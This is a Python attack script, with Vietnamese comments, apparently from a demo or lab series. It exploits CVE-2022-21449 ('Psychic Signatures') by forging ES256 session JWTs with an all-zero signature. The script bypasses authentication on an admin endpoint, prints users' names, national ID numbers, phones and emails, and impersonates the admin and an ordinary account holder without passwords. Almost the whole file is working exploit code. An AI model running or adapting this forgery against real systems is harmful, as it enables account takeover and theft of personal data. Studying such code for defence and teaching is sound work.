"""TẤN CÔNG 2 — PSYCHIC SIGNATURES / CVE-2022-21449 (qua HTTP, API công khai thật).

Chế tạo token phiên với chữ ký RỖNG (r=0, s=0). Server bỏ kiểm tra r,s ∈ [1,n-1]
nên chấp nhận → mạo danh tài khoản BẤT KỲ mà không cần mật khẩu: chiếm quyền admin
để lộ toàn bộ hồ sơ PII, và giả mạo phiên đăng nhập của người dùng khác.

    python attack_psychic.py
"""
import json

from common import get, b64u, money

# Các tài khoản demo (bỏ qua khi chọn "một user thường khác" để mạo danh)
DEMO = {"alice", "bob", "carlos", "admin"}


def forge_token(user, role):
    """JWT phiên với chữ ký RỖNG (r=s=0) cho tài khoản/vai trò tùy ý."""
    header = {"alg": "ES256", "typ": "JWT"}
    payload = {"user": user, "role": role}
    h = b64u(json.dumps(header, separators=(",", ":")).encode())
    p = b64u(json.dumps(payload, separators=(",", ":")).encode())
    sig = b64u(b"\x00" * 64)                  # r = s = 0
    return f"{h}.{p}.{sig}"


def main():
    print("=== Tấn công 2: PSYCHIC SIGNATURES (chữ ký (0,0)) ===")

    st, _ = get("/api/admin/users")
    print(f"Truy cập /api/admin/users khi chưa đăng nhập → HTTP {st} (bị từ chối).")

    st, res = get("/api/admin/users", cookie=f"session_token={forge_token('admin', 'admin')}")
    print(f"Gửi lại kèm token chữ ký (0,0) → HTTP {st}.")
    if st != 200 or not isinstance(res, dict):
        print("Không vượt qua được xác thực.")
        return

    accts = res["accounts"]
    print(f"\nChiếm quyền admin, danh sách {len(accts)} users:")
    print(f"  {'Tài khoản':<12}{'Họ tên':<20}{'CCCD':<14}{'Điện thoại':<12}Email")
    print("  " + "-" * 72)
    for a in accts[:8]:
        print(f"  {a['user']:<12}{a.get('name',''):<20}{a.get('cccd',''):<14}"
              f"{a.get('phone',''):<12}{a.get('email','')}")
    if len(accts) > 8:
        print(f"  … và {len(accts) - 8} hồ sơ khác")

    # Giả mạo JWT phiên: 1 cho admin, 1 cho một user thường
    victim = next((a["user"] for a in accts
                   if a["role"] == "user" and a["user"] not in DEMO and a["balance"] > 0), None)
    print("\nGiả mạo JWT phiên (chữ ký (0,0)) — mạo danh tài khoản, không cần mật khẩu:")
    for u, role in [("admin", "admin"), (victim, "user")]:
        if not u:
            print("  (không tìm được user thường)")
            continue
        token = forge_token(u, role)
        _, acc = get("/api/account", cookie=f"session_token={token}")
        who = acc.get("user") if isinstance(acc, dict) else None
        bal = acc.get("balance", 0) if isinstance(acc, dict) else 0
        print(f"  {u} ({role}) → đăng nhập với tư cách '{who}', số dư {money(bal)} CBC"
              f"{' ✓' if who == u else ' (thất bại)'}")
        print(f"    {token}")


if __name__ == "__main__":
    main()
